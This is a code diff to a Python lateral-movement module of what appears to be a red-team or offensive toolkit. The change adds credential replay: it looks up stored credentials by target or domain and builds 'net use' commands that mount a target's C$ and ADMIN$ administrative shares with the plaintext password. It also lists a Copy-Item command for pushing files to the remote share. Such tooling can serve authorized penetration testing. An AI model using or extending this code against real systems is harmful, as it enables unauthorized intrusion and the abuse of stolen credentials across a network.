@@ -7,6 +7,7 @@ from rich import box
 from rich.console import Console
 from modules.utils import execute_command, execute_powershell, execute_cmd, validate_target
 from modules.loghunter_integration import WindowsMoonwalk
+from modules.credential_manager import get_credential_manager, CredentialType
 
 
 class LateralModule:
@@ -94,9 +95,43 @@ class LateralModule:
         lab_use = session_data.get('LAB_USE', 0)
         is_live = lab_use != 1
         
-        console.print("[bold]Administrative Share Access:[/bold]")
+        # Try credential replay first
+        target = Prompt.ask("Target IP or hostname")
+        if not target:
+            return
+        
+        cred_manager = get_credential_manager()
+        stored_creds = cred_manager.get_credentials_by_target(target)
+        
+        # Also try domain credentials
+        if not stored_creds:
+            domain = Prompt.ask("Domain (optional)", default="")
+            if domain:
+                stored_creds = cred_manager.get_credentials_by_domain(domain)
+        
+        used_cred = None
+        if stored_creds:
+            console.print(f"\n[green]Found {len(stored_creds)} stored credential(s) for {target}[/green]")
+            if Confirm.ask("Use stored credentials?", default=True):
+                # Try passwords first
+                password_creds = [c for c in stored_creds if c.cred_type == CredentialType.PASSWORD.value and c.password]
+                if password_creds:
+                    used_cred = password_creds[0]
+                    console.print(f"[cyan]Using credential: {used_cred.username}@{used_cred.domain or 'local'}[/cyan]")
+                else:
+                    console.print("[yellow]No password credentials found, manual entry required[/yellow]")
+        
+        console.print("\n[bold]Administrative Share Access:[/bold]")
+        if used_cred:
+            username = used_cred.username
+            domain = used_cred.domain or ""
+            password = used_cred.password or ""
+            smb_cmd_template = f"net use \\\\{target}\\C$ /user:{domain}\\{username} {password}"
+        else:
+            smb_cmd_template = "net use \\\\<target>\\C$ /user:<domain>\\<user> <password>"
+        
         smb_cmds = [
-            "net use \\\\<target>\\C$ /user:<domain>\\<user> <password>",
+            smb_cmd_template if used_cred else "net use \\\\<target>\\C$ /user:<domain>\\<user> <password>",
             "net use \\\\<target>\\C$ /user:<domain>\\<user> * (prompt for password)",
             "net use \\\\<target>\\ADMIN$ /user:<domain>\\<user> <password>",
             "Copy-Item -Path <local> -Destination \\\\<target>\\C$\\<path> -Credential <cred>"
